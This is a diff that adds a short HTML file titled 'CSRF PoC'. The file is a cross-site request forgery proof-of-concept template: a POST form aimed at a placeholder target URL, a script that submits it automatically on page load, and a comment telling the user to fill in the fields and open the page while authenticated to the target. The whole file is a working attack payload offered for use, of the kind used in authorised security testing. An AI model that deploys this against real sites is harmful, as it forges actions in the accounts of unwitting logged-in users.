@@ -1,0 +1,11 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CSRF PoC</title>
+<!-- Fill in ACTION and the field names, then load this page while authenticated
+     to the target. Auto-submits on load. -->
+<body>
+<form id="f" method="POST" action="https://TARGET/CHANGE_ME">
+  <input name="field1" value="value1">
+</form>
+<script>document.getElementById('f').submit()</script>
+</body>
